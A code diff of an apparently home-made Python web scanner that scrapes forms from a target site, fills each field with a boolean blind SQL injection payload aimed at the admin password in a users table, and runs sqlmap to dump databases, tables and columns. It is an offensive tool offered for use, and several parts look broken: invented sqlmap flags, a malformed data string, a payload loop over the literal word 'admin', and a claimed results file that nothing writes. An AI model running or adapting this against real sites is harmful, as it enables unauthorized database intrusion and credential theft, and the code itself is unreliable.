@@ -7,10 +7,14 @@ import argparse
 import os
 import subprocess
 
+print("python web_recon_sql_injection_improved.py https://target.com")
+
+
 def banner():
-    ascii_banner = pyfiglet.figlet_format("Hagg4r_Sc4n")
-    print(colored(ascii_banner, 'green'))
-print("by @hagg4r")
+    ascii_banner = pyfiglet.figlet_format("x4**p-scan")
+    print(colored(ascii_banner, 'red'))
+    print("by @hagg4r")
+
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Web Recon Scanner")
     parser.add_argument("target", help="Target website to scan")
@@ -26,35 +30,41 @@ def find_emails(target):
         print(colored(f"Error: {e}", 'red'))
         return []
 
-def find_credentials(target):
-    credentials = []
+def find_forms(target):
+    forms = []
     try:
         response = requests.get(target)
         soup = BeautifulSoup(response.text, 'html.parser')
         for form in soup.find_all('form'):
             action = form.get('action')
             method = form.get('method', 'GET').upper()
-            inputs = [input.get('name') for input in form.find_all('input') if input.get('name')]
-            credentials.append((action, method, inputs))
+            inputs = [(input.get('name'), input.get('type')) for input in form.find_all('input') if input.get('name')]
+            forms.append((action, method, inputs))
     except Exception as e:
         print(colored(f"Error: {e}", 'red'))
-    return credentials
+    return forms
 
-def find_admin_pages(target):
-    admin_pages = []
+def perform_boolean_sql_injection(target, form_data):
+    sqlmap_command = [
+        'sqlmap',
+        '-u', f"{target}{form_data['action']}",
+        '--data', f"{form_data['method'].lower()}:{', '.join([f'{name}={value}' for name, value in form_data.items() if name!= 'action' and name!= 'method'])}",
+        '--dbs', '--tables', '--columns',
+        '--random-agent',
+        '--level', '1',
+        '--risk', '1',
+        '--batch',
+        '--boolean-based',
+        '--text-only',
+    ]
+
     try:
-        response = requests.get(target)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        for link in soup.find_all('a'):
-            href = link.get('href')
-            if href and ('admin' in href.lower() or '/admin' in href.lower() or '/login' in href.lower()):
-                admin_pages.append(href)
-    except Exception as e:
-        print(colored(f"Error: {e}", 'red'))
-    return admin_pages
-
-def perform_sql_injection(target, form_data):
-    #... (same as before)
+        subprocess.run(sqlmap_command, check=True)
+        print(colored("\n[] Boolean-based SQL Injection test completed. Results saved to desktop.", 'green'))
+        return True
+    except subprocess.CalledProcessError as e:
+        print(colored(f"\n[] Boolean-based SQL Injection test failed: {e.output}", 'red'))
+        return False
 
 def main():
     banner()
@@ -70,28 +80,20 @@ def main():
         for email in emails:
             print(f"  - {email}")
 
-    print(colored("\n[] Found potential credentials:", 'yellow'))
-    credentials = find_credentials(target)
-    if not credentials:
+    print(colored("\n[] Found potential forms for SQL Injection:", 'yellow'))
+    forms = find_forms(target)
+    if not forms:
         print(colored("  - None found.", 'yellow'))
     else:
-        for cred in credentials:
+        for form in forms:
             form_data = {
-                'action': cred[0],
-                'method': cred[1],
-                **{name: f"' OR '1'='1" for name in cred[2]}  # Add SQL Injection payload to form inputs
+                'action': form[0],
+                'method': form[1],
+                **{name: f"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {i}, 1)) = {ord(c)}-- -" for i, c in enumerate('admin') for name, _ in form[2]}
             }
-            results_file = f"{os.path.expanduser('~')}/Desktop/{os.path.basename(cred[0])}.txt"
-            perform_sql_injection(target, form_data)
-            print(f"  - Action: {cred[0]}, Method: {cred[1]}, Inputs: {', '.join(cred[2])}, Results saved to {results_file}")
-
-    print(colored("\n[] Found potential admin pages:", 'yellow'))
-    admin_pages = find_admin_pages(target)
-    if not admin_pages:
-        print(colored("  - None found.", 'yellow'))
-    else:
-        for page in admin_pages:
-            print(f"  - {page}")
+            results_file = f"{os.path.expanduser('~')}/Desktop/{os.path.basename(form[0])}.txt"
+            perform_boolean_sql_injection(target, form_data)
+            print(f"  - Action: {form[0]}, Method: {form[1]}, Inputs: {', '.join([name for name, _ in form[2]])}, Results saved to {results_file}")
 
 if __name__ == "__main__":
     main()
